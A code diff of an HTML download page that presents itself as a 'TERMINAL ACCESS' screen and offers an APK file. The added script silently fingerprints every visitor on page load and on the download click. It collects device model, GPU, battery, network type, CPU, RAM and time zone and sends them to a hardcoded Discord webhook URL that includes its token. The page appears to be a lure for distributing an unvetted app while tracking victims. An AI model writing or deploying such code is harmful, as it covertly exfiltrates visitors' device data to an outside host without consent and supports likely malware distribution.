@@ -3,64 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Access</title>
     <style>
         body { margin: 0; background-color: #000; color: #00ff00; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .btn { padding: 20px 40px; background: #00ff00; color: #000; text-decoration: none; font-weight: bold; border-radius: 10px; font-size: 20px; box-shadow: 0 0 20px #00ff00; }
+        .btn { padding: 20px 40px; background: #00ff00; color: #000; text-decoration: none; font-weight: bold; border-radius: 10px; font-size: 20px; box-shadow: 0 0 20px #00ff00; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
 
-    <h1>SYSTEM READY</h1>
+    <h1>TERMINAL ACCESS</h1>
     <a href="app-debug.apk" download class="btn" id="actionBtn">DOWNLOAD APK</a>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
         const sessionStart = Date.now();
 
-        // Функція швидкої відправки
-        function sendFastLog(type) {
-            const timeSpent = ((Date.now() - sessionStart) / 1000).toFixed(1);
-            
-            // Базові дані, які доступні миттєво
-            const info = {
-                model: navigator.platform,
-                cores: navigator.hardwareConcurrency || "N/A",
+        async function sendLog(type) {
+            let info = {
+                model: "Android (Захищено)",
+                cpu: navigator.hardwareConcurrency || "N/A",
                 ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
+                gpu: "N/A",
+                batt: "N/A",
+                net: "N/A",
                 zone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
+            // 1. Модель (тільки HTTPS)
+            if (navigator.userAgentData?.getHighEntropyValues) {
+                const h = await navigator.userAgentData.getHighEntropyValues(['model']);
+                info.model = h.model || "Android Device";
+            }
+
+            // 2. Відеокарта (GPU)
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
+            // 3. Батарея
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info.batt = Math.round(b.level * 100) + "%";
+            }
+
+            // 4. Тип мережі
+            if (navigator.connection) {
+                info.net = navigator.connection.effectiveType.toUpperCase();
+            }
+
+            const timeSpent = ((Date.now() - sessionStart) / 1000).toFixed(1);
+
+            // Надсилаємо ТІЛЬКИ технічку
             const payload = {
-                "content": `🚀 **ШВИДКИЙ ВХІД**: ${info.model}`,
+                "content": `🚨 **${type === 'visit' ? 'ВХІД' : 'КЛІК'}**: ${info.model}`,
                 "embeds": [{
-                    "title": type === 'visit' ? "👤 Новий візит (Миттєво)" : "📥 Клік по кнопці",
+                    "title": type === 'visit' ? "👤 Новий пристрій" : "📥 Завантаження розпочато",
                     "color": type === 'visit' ? 3066993 : 16711680,
                     "description": 
-                        `📱 **ОС/Платформа:** ${info.model}\n` +
-                        `🧠 **Ядра:** ${info.cores} | **RAM:** ${info.ram}\n` +
-                        `🌍 **Часовий пояс:** ${info.zone}\n` +
-                        `⏱ **На сайті:** ${timeSpent} сек.`
+                        `📱 **Модель:** ${info.model}\n` +
+                        `🧠 **Залізо:** ${info.cpu} ядер / ${info.ram} RAM\n` +
+                        `🎮 **GPU:** ${info.gpu}\n` +
+                        `🔋 **Батарея:** ${info.batt}\n` +
+                        `📶 **Тип мережі:** ${info.net}\n` +
+                        `🌐 **Часовий пояс:** ${info.zone}\n` +
+                        `⏱ **На сайті:** ${timeSpent} сек.\n` +
+                        `⏰ **Час:** ${new Date().toLocaleString('uk-UA')}`
                 }]
             };
 
-            // keepalive: true — дозволяє відправити дані навіть при закритті сторінки
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true 
+                body: JSON.stringify(payload)
             });
         }
 
-        // 1. Шлемо миттєво при завантаженні (без затримок)
-        sendFastLog('visit');
-
-        // 2. Додатково шлемо при натисканні на кнопку
-        document.getElementById('actionBtn').onclick = () => sendFastLog('download');
-
-        // 3. (Опціонально) Шлемо, коли людина просто закриває вкладку
-        window.onbeforeunload = () => {
-            sendFastLog('exit');
-        };
+        window.onload = () => setTimeout(() => sendLog('visit'), 1500);
+        document.getElementById('actionBtn').onclick = () => sendLog('download');
     </script>
 </body>
 </html>
